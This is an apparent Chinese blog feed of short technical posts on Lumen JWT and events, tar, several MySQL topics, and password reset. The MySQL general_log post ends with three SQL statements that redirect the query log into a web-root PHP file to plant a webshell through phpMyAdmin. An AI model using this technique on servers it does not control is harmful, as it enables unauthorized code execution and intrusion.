<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php artisan jwt:secret</span><br><span class="line"><span class="comment">//执行成功返回如下</span></span><br><span class="line">jwt-auth secret [Y] set successfully.</span><br></pre></td></tr></table></figure>

<p>执行成功后，会把生成的secret写入 .env 文件中<br>并配置jwt token 的三个时间</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">JWT_SECRET=xxxxxxxxxx</span><br><span class="line"><span class="comment">//有效时间 单位：分钟</span></span><br><span class="line">JWT_TTL = <span class="number">60</span></span><br><span class="line"><span class="comment">//刷新时间  单位：分钟  默认 14天 </span></span><br><span class="line">JWT_REFRESH_TTL = <span class="number">20160</span></span><br><span class="line"><span class="comment">//宽限时间 单位：秒</span></span><br><span class="line">JWT_BLACKLIST_GRACE_PERIOD = <span class="number">60</span></span><br></pre></td></tr></table></figure>

<p>作者更喜欢使用这个JWT扩展类 <a href="https://github.com/firebase/php-jwt" target="_blank" rel="noopener">https://github.com/firebase/php-jwt</a></p>
<h2 id="六、异步事件处理"><a href="#六、异步事件处理" class="headerlink" title="六、异步事件处理"></a>六、异步事件处理</h2><p>在很多场景中我们需要某些特定函数后台运行，例如 访问量+1 、发送短信通知、日志存储等，同步的做法是在业务逻辑执行完成以后，在执行文件末尾添加 相关的访问量统计等方法。 这对程序的效率是由很大的影响的，采用异步处理可以有效处理此类业务场景。<br>lumen提供了 events 事件处理机制。以日志监控为例，我们需要对用户请求、程序响应记录在日志服务器上面，这一块我们只需要在Middleware中拦截入口流量和出口流量，记录即可。代码如下：</p>
<ul>
<li>注册EventServiceProvider</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Event</span></span><br><span class="line">$app-&gt;register(App\Providers\EventServiceProvider::class);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>中间件流量拦截</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Middleware</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Events</span>\<span class="title">MonitorEvent</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Closure</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle an incoming request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Http\Request $request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Closure $next</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|null $guard</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">($request, Closure $next, $guard = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 开始计时</span></span><br><span class="line">        $start = microtime(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 执行业务</span></span><br><span class="line">        $response = $next($request);</span><br><span class="line">        <span class="comment">// 结束计时</span></span><br><span class="line">        $end = microtime(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  流量监控</span></span><br><span class="line">        <span class="keyword">if</span> (ENV(<span class="string">'OPEN_TRAFFIC_MONITOR'</span>, <span class="keyword">true</span>)) &#123;</span><br><span class="line">            $params = [</span><br><span class="line">                <span class="string">'ip'</span> =&gt; $request-&gt;getClientIp(),</span><br><span class="line">                <span class="string">'host'</span> =&gt; $request-&gt;getHost(),</span><br><span class="line">                <span class="string">'route'</span> =&gt; $request-&gt;path(),</span><br><span class="line">                <span class="string">'method'</span> =&gt; $request-&gt;method(),</span><br><span class="line">                <span class="string">'header'</span> =&gt; $request-&gt;header(),</span><br><span class="line">                <span class="string">'params'</span> =&gt; limit_var_size($request-&gt;all(), <span class="number">1024</span>),</span><br><span class="line">                <span class="string">'response'</span> =&gt; limit_var_size($response-&gt;getOriginalContent(), <span class="number">1024</span>),</span><br><span class="line">                <span class="string">'require_time'</span> =&gt; date(<span class="string">'Y-m-d H:i:s'</span>, $start),</span><br><span class="line">                <span class="string">'response_time'</span> =&gt; date(<span class="string">'Y-m-d H:i:s'</span>, $end),</span><br><span class="line">                <span class="string">'ttl'</span> =&gt; $end - $start,</span><br><span class="line">                <span class="string">'status'</span> =&gt; $response-&gt;getStatusCode(),</span><br><span class="line">            ];</span><br><span class="line">            <span class="comment">// 触发事件</span></span><br><span class="line">            event(<span class="keyword">new</span> MonitorEvent($params));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>事件接收器</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Events</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Queue</span>\<span class="title">SerializesModels</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Event</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SerializesModels</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new event instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>事件监听处理</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Listeners</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Events</span>\<span class="title">Event</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Pub</span>\<span class="title">V1</span>\<span class="title">Logic</span>\<span class="title">MonitorLogic</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MonitorListener</span> <span class="keyword">extends</span> <span class="title">Listener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the event.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $event</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(Event $event)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> MonitorLogic())-&gt;run($event-&gt;getData());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>注册事件处理</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Laravel</span>\<span class="title">Lumen</span>\<span class="title">Providers</span>\<span class="title">EventServiceProvider</span> <span class="title">as</span> <span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The event listener mappings for the application.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $listen = [</span><br><span class="line">        <span class="string">'App\Events\MonitorEvent'</span> =&gt; [</span><br><span class="line">            <span class="string">'App\Listeners\MonitorListener'</span>,</span><br><span class="line">        ], </span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最重要的一步, .env配置中 <code>QUEUE_DRIVER=sync</code> 改为 <code>QUEUE_DRIVER=redis</code>，即把同步队列设置为异步队列。</p>
<p>配置完成，启动队列： <code>php artisan queue:listen</code>  </p>
]]></content>
  </entry>
  <entry>
    <title>Linux解压文件到指定目录</title>
    <url>/articles/Linux%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<p>tar在Linux上是常用的打包、压缩、加压缩工具，他的参数很多，折里仅仅列举常用的压缩与解压缩参数</p>
<p>参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-c ：create 建立压缩档案的参数；</span><br><span class="line"></span><br><span class="line">-x ： 解压缩压缩档案的参数；</span><br><span class="line"></span><br><span class="line">-z ： 是否需要用gzip压缩；</span><br><span class="line"></span><br><span class="line">-v： 压缩的过程中显示档案；</span><br><span class="line"></span><br><span class="line">-f： 置顶文档名，在f后面立即接文件名，不能再加参数</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<p>将整个/home/www/images 目录下的文件全部打包为 /home/www/images.tar</p>
<p><code>tar -cvf /home/www/images.tar /home/www/images</code> ← 仅打包，不压缩<br><code>tar -zcvf /home/www/images.tar.gz /home/www/images</code> ← 打包后，以gzip压缩</p>
<p>在参数f后面的压缩文件名是自己取的，习惯上用tar来做，如果加z参数，则以tar.gz 或tgz来代表gzip压缩过的tar file文件</p>
<p>1 将tgz文件解压到指定目录</p>
<p><code>tar zxvf test.tgz -C 指定目录</code></p>
<p>比如将/source/kernel.tgz解压到 /source/linux-2.6.29 目录</p>
<p><code>tar zxvf /source/kernel.tgz -C /source/ linux-2.6.29</code></p>
<p>2 将指定目录压缩到指定文件</p>
<p>比如将linux-2.6.29 目录压缩到 kernel.tgz</p>
<p><code>tar czvf kernel.tgz linux-2.6.29</code></p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL MERGE存储引擎</title>
    <url>/articles/MySQL-MERGE%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/</url>
    <content><![CDATA[<p>MERGE存储引擎把一组MyISAM数据表当做一个逻辑单元来对待，让我们可以同时对他们进行查询，是一种简单的分表方案。</p>
<p>例如将日志表按日期分为 <em>log_20221103</em>, <em>log_20221104</em> 两张表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`log_20221103`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`log`</span> <span class="built_in">varchar</span>(<span class="number">45</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=latin1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`log_20221104`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`log`</span> <span class="built_in">varchar</span>(<span class="number">45</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=latin1;</span><br></pre></td></tr></table></figure>

<p>分别插入数据：</p>
<p>log_20221103：</p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">log</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">3</td>
</tr>
</tbody></table>
<p>log_20221104:</p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">log</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">a</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">b</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">c</td>
</tr>
</tbody></table>
<p>创建Merge表:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`log_merge`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`log`</span> <span class="built_in">varchar</span>(<span class="number">45</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MRG_MyISAM <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=latin1 INSERT_METHOD=<span class="keyword">LAST</span> <span class="keyword">UNION</span>=(<span class="string">`log_20221103`</span>,<span class="string">`log_20221104`</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">解释：</span></span><br><span class="line"><span class="comment">1）ENGINE=MERGE 指明使用MERGE引擎。</span></span><br><span class="line"><span class="comment">2）UNION=(`log_20221103`,`log_20221104`) 指明了MERGE表中挂接了些哪表，可以通过alter table (如移除基础表log_20221104： ALTER TABLE `log_merge` UNION = (`log_20221103`);)的方式修改UNION的值，以实现增删MERGE表子表的功能。</span></span><br><span class="line"><span class="comment">3）INSERT_METHOD=LAST 指明往merge表插入方式，取值可以是：0 不允许插入；FIRST 插入到UNION中的第一个表； LAST 插入到UNION中的最后一个表。</span></span><br><span class="line"><span class="comment">4）MERGE表及构成MERGE数据表结构的各成员数据表必须具有完全一样的结构。每一个成员数据表的数据列必须按照同样的顺序定义同样的名字和类型，索引也必须按照同样的顺序和同样的方式定义。</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>

<p>执行<code>select * from log_merge</code> 将会得到如下结果:</p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">log</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">a</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">b</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">c</td>
</tr>
</tbody></table>
<p>从效果上看，两张表记录如同union在一起了一样, 但是需要注意的是：</p>
<p><strong>1.</strong> 此表结构必须与基本表完全一致，包括列名、顺序。UNION表必须同属一个DATABASE。<br><strong>2.</strong> 此表类似于SQL中的union机制。<br><strong>3.</strong> 基本表类型必须是MyISAM的。<br><strong>4.</strong> 可以通过修改.mrg文件来修改MERGE表，每个基本表的名字占一行。注意：修改后要通过FLUSH TABLES刷新表缓存。<br><strong>5.</strong> 对基本表的更改可以直接反映在此表上。<br><strong>6.</strong> INSERT_METHOD的取值可以是： 0 不允许插入 FIRST 插入到UNION中的第一个表 LAST 插入到UNION中的最后一个表。(4.0之后可用)<br><strong>7.</strong> 定义在它上面的约束没有任何作用，约束是由基本表控制的，例如两个基本表中存在着同样的一个Key值，那么在MERGE表中会有两个一样的Key值。<br><strong>8.</strong> 在数据量、查询量较大的情况下, 使用Merge表会很影响性能，原因参考2。<br><strong>9.</strong> 查询结果及顺序与创建Merge表时联合表的顺序有关。<br><strong>10.</strong> 当key一样的时候，修改Merge表内容会影响key对应的第一条数据，和9有关。<br><strong>11.</strong> <code>TRUNCATE Merge表的时候会同时truncate基础表，请慎重操作。</code> 但是DELETE merge表的时候对基础表是没有影响的。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql merge引擎</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL误区</title>
    <url>/articles/MySQL%E8%AF%AF%E5%8C%BA/</url>
    <content><![CDATA[<p>mysql子查询含有limit时报错：</p>
<p>ERROR 1235 (42000): This version of MySQL doesn’t yet support ‘LIMIT &amp; IN/ALL/ANY/SOME subquery’</p>
<p>这样的SQL无法执行 :</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">limit</span> <span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p>解决方法</p>
<p>如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> (<span class="keyword">select</span> t.id <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">limit</span> <span class="number">10</span>)<span class="keyword">as</span> t)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL中trim()函数的用法</title>
    <url>/articles/MySQL%E4%B8%ADtrim-%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>trim函数可以过滤指定的字符串：</p>
<p>完整格式：TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM] str)</p>
<p>简化格式：TRIM([remstr FROM] str)</p>
<p>返回字符串 str ， 其中所有remstr前缀和/或后缀都已被删除。若分类符BOTH、LEADIN或TRAILING中没有一个是给定的,则假设为BOTH。remstr为可选项，在未指定情况下，可删除空格。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT TRIM(&apos;  bar   &apos;);</span><br><span class="line"></span><br><span class="line">-&gt; &apos;bar&apos;</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT TRIM(LEADING &apos;x&apos; FROM &apos;xxxbarxxx&apos;);   --删除指定的首字符 x</span><br><span class="line"></span><br><span class="line">-&gt; &apos;barxxx&apos;</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT TRIM(BOTH &apos;x&apos; FROM &apos;xxxbarxxx&apos;);      --删除指定的首尾字符 x</span><br><span class="line"></span><br><span class="line">-&gt; &apos;bar&apos;</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT TRIM(TRAILING &apos;xyz&apos; FROM &apos;barxxyz&apos;);  --删除指定的尾字符 x</span><br><span class="line"></span><br><span class="line">-&gt; &apos;barx&apos;</span><br></pre></td></tr></table></figure>

<p>mysql中的去除左空格函数:</p>
<p>LTRIM(str);</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT LTRIM(&apos;  barbar&apos;);</span><br><span class="line"></span><br><span class="line">-&gt; &apos;barbar&apos;</span><br></pre></td></tr></table></figure>

<p>mysql中的去除右空格函数：</p>
<p>RTRIM(str):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT RTRIM(&apos;barbar   &apos;);</span><br><span class="line"></span><br><span class="line">-&gt; &apos;barbar&apos;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>MySQL修改root密码的4种方法(以windows为例)</title>
    <url>/articles/MySQL%E4%BF%AE%E6%94%B9root%E5%AF%86%E7%A0%81%E7%9A%844%E7%A7%8D%E6%96%B9%E6%B3%95-%E4%BB%A5windows%E4%B8%BA%E4%BE%8B-/</url>
    <content><![CDATA[<blockquote>
<p>方法1： 用SET PASSWORD命令</p>
</blockquote>
<p>首先登录MySQL。</p>
<p>格式：<code>set password for 用户名@localhost = password(&#39;新密码&#39;)</code>;</p>
<p>例子：<code>set password for root@localhost = password(&#39;123&#39;)</code>;</p>
<blockquote>
<p>方法2：用mysqladmin</p>
</blockquote>
<p>格式：<code>mysqladmin -u用户名 -p旧密码 password 新密码</code></p>
<p>例子：<code>mysqladmin -uroot -p123456 password 123</code></p>
<blockquote>
<p>方法3：用UPDATE直接编辑user表</p>
</blockquote>
<p>首先登录MySQL。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line"></span><br><span class="line">mysql&gt; update user set password=password('123') where user='root' and host='localhost';</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>方法4：在忘记root密码的时候，可以这样</p>
</blockquote>
<p>以windows为例：</p>
<ul>
<li><p>关闭正在运行的MySQL服务。</p>
</li>
<li><p>打开DOS窗口，转到mysql\bin目录。</p>
</li>
<li><p>输入mysqld –skip-grant-tables 回车。–skip-grant-tables 的意思是启动MySQL服务的时候跳过权限表认证。</p>
</li>
<li><p>再开一个DOS窗口（因为刚才那个DOS窗口已经不能动了），转到mysql\bin目录。</p>
</li>
<li><p>输入mysql回车，如果成功，将出现MySQL提示符 &gt;。</p>
</li>
<li><p>连接权限数据库： use mysql; 。</p>
</li>
<li><p>改密码：update user set password=password(“123”) where user=”root”;（别忘了最后加分号） 。</p>
</li>
<li><p>刷新权限（必须步骤）：flush privileges; 。</p>
</li>
<li><p>退出 quit。</p>
</li>
<li><p>注销系统，再进入，使用用户名root和刚才设置的新密码123登录。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>MYSQL事务隔离级别</title>
    <url>/articles/MYSQL%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB/</url>
    <content><![CDATA[<p>事务的隔离级别分为：未提交读(READ UNCOMMITTED)、已提交读(READ COMMITTED)、可重复读(REPEATABLE READ)、串行化(SERIALIZABLE)。</p>
<blockquote>
<p>mysql数据库，当且仅当引擎是InnoDB，才支持事务</p>
</blockquote>
<ul>
<li>未提交读 (READ UNCOMMITTED)</li>
</ul>
<p>A事务已执行，但未提交；B事务查询到A事务的更新后数据；A事务回滚；—出现脏数据（脏读）</p>
<ul>
<li>已提交读 (READ COMMITTED)</li>
</ul>
<p>A事务执行更新；B事务查询；A事务又执行更新；B事务再次查询时，前后两次数据不一致；—不可重复读，可以解决脏读</p>
<ul>
<li>可重复读 (REPEATABLE READ)</li>
</ul>
<p>A事务无论执行多少次，只要不提交，B事务查询值都不变；B事务仅查询B事务开始时那一瞬间的数据快照；—mysql默认的，可以解决脏读 和 不可重复读</p>
<ul>
<li>串行化 (SERIALIZABLE)</li>
</ul>
<p>不允许读写并发操作，写执行时，读必须等待。—相当于锁表，可以解决 脏读 不可重复读 和 虚读</p>
<h3 id="查看隔离级别"><a href="#查看隔离级别" class="headerlink" title="查看隔离级别"></a>查看隔离级别</h3><p>全局事务级别： </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @@GLOBAL.tx_isolation  或 <span class="keyword">SELECT</span> @@GLOBAL.transaction_isolation</span><br></pre></td></tr></table></figure>

<p>会话事务级别： </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @@SESSION.tx_isolation 或 <span class="keyword">SELECT</span> @@SESSION.transaction_isolation</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%iso%'</span>;</span><br></pre></td></tr></table></figure>

<h3 id="设置隔离级别"><a href="#设置隔离级别" class="headerlink" title="设置隔离级别"></a>设置隔离级别</h3><p>临时有效</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> [<span class="keyword">SESSION</span> | <span class="keyword">GLOBAL</span>] <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> &#123;<span class="keyword">READ</span> UNCOMMITTED | <span class="keyword">READ</span> COMMITTED | REPEATABLE <span class="keyword">READ</span> | <span class="keyword">SERIALIZABLE</span>&#125;</span><br></pre></td></tr></table></figure>

<p>持久有效</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">transaction-isolation</span> = REPEATABLE-READ</span><br><span class="line"><span class="attr">transaction-read-only</span> = <span class="literal">OFF</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL开启general_log跟踪sql执行记录</title>
    <url>/articles/MySQL%E5%BC%80%E5%90%AFgeneral-log%E8%B7%9F%E8%B8%AAsql%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>设置general log保存路径,注意在Linux中只能设置到 /tmp 或 /var 文件夹下，设置其他路径出错,同时需要root用户才有访问此文件的权限，代码如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global general_log_file='/tmp/general.lg';    #设置路径</span><br><span class="line"></span><br><span class="line">mysql&gt; set global general_log=on;    # 开启general log模式</span><br><span class="line"></span><br><span class="line">mysql&gt; set global general_log=off;   # 关闭general log模式</span><br></pre></td></tr></table></figure>

<p>命令行设置即可,无需重启</p>
<p>在general log模式开启过程中，所有对数据库的操作都将被记录 general.log 文件 或 可以将日志记录在表中, 如下</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt;set global log_output='table'</span><br></pre></td></tr></table></figure>

<p>运行后,可以在mysql数据库下查找 general_log表</p>
<p><code>延伸</code>： 根据上面的原理我们可以根据三个sql语句拿下phpmyadmin的shell</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global general_log='on';</span><br><span class="line"></span><br><span class="line">mysql&gt; SET global general_log_file='D:/webshell/www/cmd.php';</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT 'shell code';</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL server has gone away</title>
    <url>/articles/MySQL%20server%20has%20gone%20away/</url>
    <content><![CDATA[<p>工作中经常需要导入或者导出较大的sql文件。导出时一般没问题，但在导入到其它Mysql库中，可能会出现</p>
<p><code>Packet for query is too large (1706 &gt; 1024). You can change this value on the server by setting the max_allowed_packet&#39; variable.</code></p>
<p>或者程序（如python里面executemany）在插入大量数据时出现</p>
<p><code>MySQL server has gone away</code></p>
<p>这些错误都可能是Mysql的mysql max_allowed_packet默认值太小。修改该值一般游两种方式。</p>
<blockquote>
<p>方式一：sql语句修改</p>
</blockquote>
<p>1、首先登陆mysql查看当前该值的大小。</p>
<p>show variables like ‘%max_allowed_packet%’</p>
<p>2、修改其大小为1G</p>
<p>set global max_allowed_packet = 1024<em>1024</em>1024</p>
<p>注意： 这种修改方式修改后，需要重新登陆Mysql查看，才能看到修改后的值，并且，这种方式修改的mysql max_allowed_packet，在Mysql重启后，可能失效。</p>
<blockquote>
<p>方式二：my.ini修改</p>
</blockquote>
<p>1、在my.ini 或 my.cnf 文件中添加如下语句。比如：改为1G。 如下图所示。修改完成后，需要重启mysql。</p>
<p><img src="/articles/MySQL server has gone away/psb.png" alt="my.ini"></p>
<p>注意：这种方式 max_allowed_packet 一定是添加在【mysqld】才能生效。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>NGINX常用指令</title>
    <url>/articles/NGINX%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
